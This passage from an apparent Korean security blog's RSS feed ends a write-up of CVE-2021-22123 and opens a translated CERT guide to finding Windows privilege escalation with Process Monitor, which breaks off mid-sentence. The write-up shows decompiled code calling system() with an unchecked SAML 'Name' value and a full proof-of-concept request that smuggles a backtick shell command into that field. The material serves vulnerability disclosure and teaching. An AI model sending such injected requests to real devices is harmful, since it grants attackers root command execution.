= access(buf,<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) {<span class="hljs-built_in">snprintf</span>(buf,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;mkdir %s/%s&quot;</span>,<span class="hljs-string">&quot;/data/etc/saml/shibboleth/service_providers&quot;</span>,name);iVar1 = system(buf); <span class="hljs-comment">// here</span><span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) {<span class="hljs-keyword">return</span> iVar1;}}<span class="hljs-built_in">snprintf</span>(buf,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;cp %s %s/%s/%s.%s&quot;</span>,path,<span class="hljs-string">&quot;/data/etc/saml/shibboleth/service_providers&quot;</span>,name,<span class="hljs-string">&quot;Metadata&quot;</span>,&amp;DAT_00212758);iVar1 = system(buf); <span class="hljs-comment">// here</span><span class="hljs-keyword">return</span> iVar1;}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC778;&#xC790; name&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; SAML Server &#xC124;&#xC815; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xD55C; &#x201C;Name&#x201D; &#xC785;&#xB825;&#xB780;&#xC5D0; &#xC785;&#xB825;&#xD55C; &#xB0B4;&#xC6A9;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#x201C;;&#x201D;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC775;&#xC2A4;&#xCF54;&#xB4DC; &#xC608;&#xC2DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">POST /api/v2<span class="hljs-number">.0</span>/user/remoteserver.saml HTTP/<span class="hljs-number">1.1</span>Host: [redacted]Cookie: [redacted]User-Agent: [redacted]Accept: application/json, text/plain, *<span class="hljs-comment">/*</span><span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><span class="hljs-comment">Referer: https://[redacted]/root/user/remote-user/saml-user/</span><span class="hljs-comment">X-Csrftoken: 814940160</span><span class="hljs-comment">Content-Type: multipart/form-data; boundary=---------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Length: 3068</span><span class="hljs-comment">Origin: https://[redacted]</span><span class="hljs-comment">Dnt: 1</span><span class="hljs-comment">Te: trailers</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;q_type&quot;</span><span class="hljs-comment">1</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;name&quot;</span><span class="hljs-comment">`touch /tmp/vulnerable`</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;entityID&quot;</span><span class="hljs-comment">test</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;service-path&quot;</span><span class="hljs-comment">/saml.sso</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;session-lifetime&quot;</span><span class="hljs-comment">8</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;session-timeout&quot;</span><span class="hljs-comment">30</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;sso-bind&quot;</span><span class="hljs-comment">post</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;sso-bind_val&quot;</span><span class="hljs-comment">1</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;sso-path&quot;</span><span class="hljs-comment">/SAML2/POST</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;slo-bind&quot;</span><span class="hljs-comment">post</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;slo-bind_val&quot;</span><span class="hljs-comment">1</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;slo-path&quot;</span><span class="hljs-comment">/SLO/POST</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;flag&quot;</span><span class="hljs-comment">0</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;enforce-signing&quot;</span><span class="hljs-comment">disable</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;enforce-signing_val&quot;</span><span class="hljs-comment">0</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;metafile&quot;; filename=&quot;test.xml&quot;</span><span class="hljs-comment">Content-Type: text/xml</span><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-comment">&lt;md:EntityDescriptor xmlns:md=&quot;urn:oasis:names:tc:SAML:2.0:metadata&quot; validUntil=&quot;2021-06-12T16:54:31Z&quot; cacheDuration=&quot;PT1623948871S&quot; entityID=&quot;test&quot;&gt;</span><span class="hljs-comment">&lt;md:IDPSSODescriptor WantAuthnRequestsSigned=&quot;false&quot; protocolSupportEnumeration=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;&gt;</span><span class="hljs-comment">&lt;md:KeyDescriptor use=&quot;signing&quot;&gt;</span><span class="hljs-comment">&lt;ds:KeyInfo xmlns:ds=&quot;http://www.w3.org/2000/09/xmldsig#&quot;&gt;</span><span class="hljs-comment">&lt;ds:X509Data&gt;</span><span class="hljs-comment">&lt;ds:X509Certificate&gt;test&lt;/ds:X509Certificate&gt;</span><span class="hljs-comment">&lt;/ds:X509Data&gt;</span><span class="hljs-comment">&lt;/ds:KeyInfo&gt;</span><span class="hljs-comment">&lt;/md:KeyDescriptor&gt;</span><span class="hljs-comment">&lt;md:KeyDescriptor use=&quot;encryption&quot;&gt;</span><span class="hljs-comment">&lt;ds:KeyInfo xmlns:ds=&quot;http://www.w3.org/2000/09/xmldsig#&quot;&gt;</span><span class="hljs-comment">&lt;ds:X509Data&gt;</span><span class="hljs-comment">&lt;ds:X509Certificate&gt;test&lt;/ds:X509Certificate&gt;</span><span class="hljs-comment">&lt;/ds:X509Data&gt;</span><span class="hljs-comment">&lt;/ds:KeyInfo&gt;</span><span class="hljs-comment">&lt;/md:KeyDescriptor&gt;</span><span class="hljs-comment">&lt;md:NameIDFormat&gt;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&lt;/md:NameIDFormat&gt;</span><span class="hljs-comment">&lt;md:SingleSignOnService Binding=&quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect&quot; Location=&quot;test&quot;/&gt;</span><span class="hljs-comment">&lt;/md:IDPSSODescriptor&gt;</span><span class="hljs-comment">&lt;/md:EntityDescriptor&gt;</span><span class="hljs-comment">-----------------------------94351131111899571381631694412--</span><span class="hljs-comment">HTTP/1.1 500 Internal Server Error</span><span class="hljs-comment">Date: Thu, 10 Jun 2021 11:59:45 GMT</span><span class="hljs-comment">Cache-Control: no-cache, no-store, must-revalidate</span><span class="hljs-comment">Pragma: no-cache</span><span class="hljs-comment">Set-Cookie: [redacted]</span><span class="hljs-comment">X-Frame-Options: SAMEORIGIN</span><span class="hljs-comment">X-XSS-Protection: 1; mode=block</span><span class="hljs-comment">Content-Security-Policy: frame-ancestors &apos;self&apos;</span><span class="hljs-comment">X-Content-Type-Options: nosniff</span><span class="hljs-comment">Content-Length: 20</span><span class="hljs-comment">Strict-Transport-Security: max-age=63072000</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">Content-Type: application/json</span><span class="hljs-comment">{&quot;errcode&quot;: &quot;-651&quot;}</span></code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/fortinet/">fortinet</category>
      
      <category domain="https://hackyboiz.github.io/tags/fortiwebos/">fortiwebos</category>
      
      <category domain="https://hackyboiz.github.io/tags/command-injection/">command_injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/waf/">waf</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2021-22123/">CVE-2021-22123</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/20/j0ker/2021-08-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Process Monitor로 Windows의 권한 상승 취약점 찾기</title>
      <link>https://hackyboiz.github.io/2021/08/18/l0ch/procmon-lpe/</link>
      <guid>https://hackyboiz.github.io/2021/08/18/l0ch/procmon-lpe/</guid>
      <pubDate>Wed, 18 Aug 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xC624;&amp;#xB298; &amp;#xB4E4;&amp;#xACE0;&amp;#xC628; &amp;#xBC88;&amp;#xC5ED;&amp;#xAE00;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC624;&#xB298; &#xB4E4;&#xACE0;&#xC628; &#xBC88;&#xC5ED;&#xAE00;&#xC740; &#xBCF5;&#xC7A1;&#xD55C; &#xBD84;&#xC11D; &#xC5C6;&#xC774; Process Monitor&#xB85C;&#xB9CC; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294; Windows&#xC758; &#xAC04;&#xB2E8;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xB370;&#xC694;, &#xC26C;&#xC6B4; &#xB0B4;&#xC6A9;&#xC774;&#xB77C; &#xBD80;&#xB2F4;&#xC5C6;&#xC774; &#xC77D;&#xAE30; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC544; &#xC2AC;&#xCA4D; &#xBC88;&#xC5ED;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><blockquote><p>&#xC6D0;&#xBB38; : <a href="https://vuls.cert.org/confluence/display/Wiki/2021/06/21/Finding+Privilege+Escalation+Vulnerabilities+in+Windows+using+Process+Monitor#FindingPrivilegeEscalationVulnerabilitiesinWindowsusingProcessMonitor-Useofalibrarythatloadsfromanunexpectedpath">Finding Privilege Escalation Vulnerabilities in Windows using Process Monitor</a></p></blockquote><hr><h1 id="&#xAC1C;&#xC694;"><a href="#&#xAC1C;&#xC694;" class="headerlink" title="&#xAC1C;&#xC694;"></a>&#xAC1C;&#xC694;</h1><p>&#xC774; &#xAC8C;&#xC2DC;&#xBB3C;&#xC740; &#xCC3E;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xB4DC;&#xBB38; Windows&#xC758; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD55C;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD80;&#xBD84;&#xC801;&#xC73C;&#xB85C; &#xC644;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC744; &#xC18C;&#xAC1C;&#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xB0B4;&#xAC00; &#xBCF4;&#xACE0;&#xC2F6;&#xC5B4;&#xD558;&#xB294; &#xBCC0;&#xD654;&#xB294; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xC774;&#xB7EC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC778;&#xC9C0;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p><a href="https://vuls.cert.org/confluence/display/tools/CERT+BFF+-+Basic+Fuzzing+Framework">CERT BFF</a>&#xB97C; &#xCC98;&#xC74C; &#xCD9C;&#xC2DC;&#xD588;&#xC744; &#xB54C; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xAC1C;&#xB150; &#xC99D;&#xBA85; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><ol><li>&#xD0C0;&#xAC9F;&#xC758; instruction pointer&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC744;&#xB54C;&#xAE4C;&#xC9C0; &#xD37C;&#xC9D5;&#xD55C;&#xB2E4;.</li><li><a href="https://insights.sei.cmu.edu/blog/visualizing-cert-bff-string-minimization/">BFF string minimization</a>&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xACF5;&#xAC04;&#xC744; &#xCC3E;&#xB294;&#xB2E4;.</li><li>&#xD544;&#xC694;&#xC5D0; &#xB530;&#xB77C; <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD750;&#xB984;&#xC744; &#xC218;&#xC815;&#xD55C;&#xB2E4;.</li></ol><p>CERT BFF&#xB97C; &#xC0AC;&#xC6A9;&#xD574; PoC&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC740; &#xBE44;&#xAD50;&#xC801; &#xAC04;&#xB2E8;&#xD588;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB0A8;&#xC5D0; &#xB530;&#xB77C; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xC900;&#xC774; &#xB192;&#xC544;&#xC84C;&#xB294;&#xB370;, &#xC774;&#xAC83;&#xC740; &#xC218;&#xB144;&#xC5D0; &#xAC78;&#xCCD0; &#xC77C;&#xC5B4;&#xB09C; &#xB450; &#xAC00;&#xC9C0; &#xC77C; &#xB54C;&#xBB38;&#xC77C; &#xC218; &#xC788;&#xB2E4;.</p><ol><li>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xACF5;&#xAE09; &#xC5C5;&#xCCB4;&#xC758; &#xD37C;&#xC9D5;&#xD14C;&#xC2A4;&#xD2B8; &#xC99D;&#xAC00;</li><li>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBC0F; &#xD50C;&#xB7AB;&#xD3FC; &#xBAA8;&#xB450;&#xC5D0;&#xC11C;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xC874;&#xC7AC; &#xC99D;&#xAC00;</li></ol><p>&#xCD5C;&#xADFC; BFF &#xCD08;&#xAE30;&#xB97C; &#xC0DD;&#xAC01;&#xB098;&#xAC8C; &#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xACAC; &#xAE30;&#xC220;&#xC5D0; &#xB300;&#xD574; &#xC791;&#xC5C5;&#xD588;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xAC83;&#xACFC; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xC26C;&#xC6B4;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xB290;&#xAF08;&#xC73C;&#xBA70; &#xAC1C;&#xB150;&#xC774; &#xB108;&#xBB34; &#xC0AC;&#xC18C;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xB370; &#xC131;&#xACF5;&#xD588;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC5D0; &#xB180;&#xB790;&#xB2E4;. BFF&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xD37C;&#xC9D5;&#xC5D0;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xAE4C;&#xC9C0;&#xC758; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xAC00; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB0A8;&#xC5D0; &#xB530;&#xB77C; &#xC810;&#xC810; &#xC5B4;&#xB824;&#xC6CC;&#xC9C4; &#xAC83;&#xCC98;&#xB7FC; &#xC774; &#xAE30;&#xC220;&#xB85C; &#xC27D;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD6E8;&#xC52C; &#xC904;&#xC5B4;&#xB4E4;&#xC5C8;&#xC73C;&#xBA74; &#xD55C;&#xB2E4;.</p><p>&#xC774; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0;&#xC11C;&#xB294; <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Sysinternals Process Monitor</a> (Procmon)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBC1C;&#xACAC;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810; &#xC911; &#xC77C;&#xBD80;&#xB97C; &#xACF5;&#xC720;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><h1 id="&#xAC1C;&#xB150;"><a href="#&#xAC1C;&#xB150;" class="headerlink" title="&#xAC1C;&#xB150;"></a>&#xAC1C;&#xB150;</h1><p>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; Windows &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0; &#xC124;&#xCE58;&#xB418;&#xBA74; &#xD604;&#xC7AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB85C;&#xADF8;&#xC628;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC5D0; &#xAD00;&#xACC4;&#xC5C6;&#xC774; &#xC77C;&#xBD80; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xAC00; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC5D0;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB450; &#xAC00;&#xC9C0; &#xD615;&#xC2DD;&#xC774; &#xC788;&#xB2E4;.</p><ol><li>&#xC124;&#xCE58;&#xB41C; &#xC11C;&#xBE44;&#xC2A4;</li><li>&#xC608;&#xC57D;&#xB41C; &#xC791;&#xC5C5;(Task)</li></ol><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xB294; &#xB9AC;&#xC18C;&#xC2A4;&#xC640; &#xAD8C;&#xD55C;&#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC131;&#xC758; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC544;&#xC9C4;&#xB2E4;.</p><h1 id="&#xCC3E;&#xC544;&#xC57C;-&#xD558;&#xB294;-&#xAC83;"><a href="#&#xCC3E;&#xC544;&#xC57C;-&#xD558;&#xB294;-&#xAC83;" class="headerlink" title="&#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB294; &#xAC83;"></a>&#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB294; &#xAC83;</h1><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC00;&#xC7A5; &#xC26C;&#xC6B4; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xD544;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><ol><li>&#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD30C;&#xC77C; &#xB610;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;</li><li>&#xC0C1;&#xC2B9;&#xB41C; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;</li><li>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC4F8; &#xC218; &#xC788;&#xB294; &#xC704;&#xCE58;</li></ol><p>1&#xACFC; 2&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130;&#xC5D0;&#xC11C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB098; &#xAC80;&#xC0AC; 3&#xC740; &#xC880; &#xB354; &#xBCF5;&#xC7A1;&#xD558;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xD544;&#xD130;&#xB85C; &#xC218;&#xD589;&#xD560; &#xB54C; &#xC77C;&#xBD80; &#xC624;&#xD0D0;&#xC9C0;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xB370; &#xC88B;&#xC740; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; <a href="https://github.com/certcc/privesc">&#xD544;&#xD130;</a>&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xB2E4; .</p><h1 id="&#xD544;&#xD130;-&#xC0AC;&#xC6A9;"><a href="#&#xD544;&#xD130;-&#xC0AC;&#xC6A9;" class="headerlink" title="&#xD544;&#xD130; &#xC0AC;&#xC6A9;"></a>&#xD544;&#xD130; &#xC0AC;&#xC6A9;</h1><p>Privesc.PMF &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xD544;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#xBE44;&#xAD50;&#xC801; &#xAC04;&#xB2E8;&#xD558;&#xB2E4;.</p><ol><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xBD80;&#xD305; &#xB85C;&#xAE45; &#xD65C;&#xC131;&#xD654;(&#xC635;&#xC158; &#x2192; &#xBD80;&#xD305; &#xB85C;&#xAE45; &#xD65C;&#xC131;&#xD654;)</li><li>&#xC7AC;&#xBD80;&#xD305; &#xBC0F; &#xB85C;&#xADF8;&#xC778;</li><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xC2E4;&#xD589;</li><li><p>&#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xD45C;&#xC2DC;&#xB418;&#xBA74; &#xBD80;&#xD305; &#xB85C;&#xADF8;&#xB97C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;.</p><p> <img src="/2021/08/18/l0ch/procmon-lpe/Untitled.png" alt="Untitled"></p></li><li><p>Privesc &#xD544;&#xD130; &#xAC00;&#xC838;&#xC624;&#xAE30;(&#xD544;&#xD130; &#x2192; &#xD544;&#xD130; &#xAD6C;&#xC131; &#x2192; &#xAC00;&#xC838;&#xC624;&#xAE30;&#x2026;)</p></li><li>Privesc &#xD544;&#xD130; &#xC801;&#xC6A9;(Filter &#x2192; Load Filter &#x2192; Privesc)</li><li>&#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xD30C;&#xC77C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xCC3E;&#xC544; &#xC870;&#xC0AC;</li></ol><h1 id="&#xC870;&#xC0AC;-&#xACB0;&#xACFC;"><a href="#&#xC870;&#xC0AC;-&#xACB0;&#xACFC;" class="headerlink" title="&#xC870;&#xC0AC; &#xACB0;&#xACFC;"></a>&#xC870;&#xC0AC; &#xACB0;&#xACFC;</h1><p>VMware Tools&#xAC00; &#xC124;&#xCE58;&#xB41C; 64&#xBE44;&#xD2B8; Windows 10 2004 &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xC758; &#xBD80;&#xD2B8; &#xB85C;&#xADF8;&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF8;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%201.png" alt="Untitled"></p><p>VM&#xC5D0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xAC70;&#xC758; &#xC124;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xC774;&#xBBF8; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs c">C:\Program%<span class="hljs-number">20F</span>iles\</code></pre><p>Windows &#xC0AC;&#xC6A9;&#xC790;&#xB294; <code>C:\Program Files\</code> &#xACBD;&#xB85C;&#xC5D0; &#xC775;&#xC219;&#xD558;&#xC9C0;&#xB9CC; &#xC704; &#xACB0;&#xACFC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>%20</code>&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBB38;&#xC790;&#xB294; &#xC544;&#xB2CC; &#xAC83; &#xAC19;&#xB2E4;. &#xC65C; &#xC774;&#xB7EC;&#xD55C; &#xACB0;&#xACFC;&#xAC00; &#xB098;&#xD0C0;&#xB098;&#xB294;&#xC9C0;&#xB294; &#xC544;&#xB798; &#xC139;&#xC158;&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;.</p><h1 id="&#xAC1C;&#xBC1C;&#xC790;&#xC758;-&#xC2E4;&#xC218;"><a href="#&#xAC1C;&#xBC1C;&#xC790;&#xC758;-&#xC2E4;&#xC218;" class="headerlink" title="&#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC2E4;&#xC218;"></a>&#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC2E4;&#xC218;</h1><p>&#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC601;&#xD5A5;&#xC744; 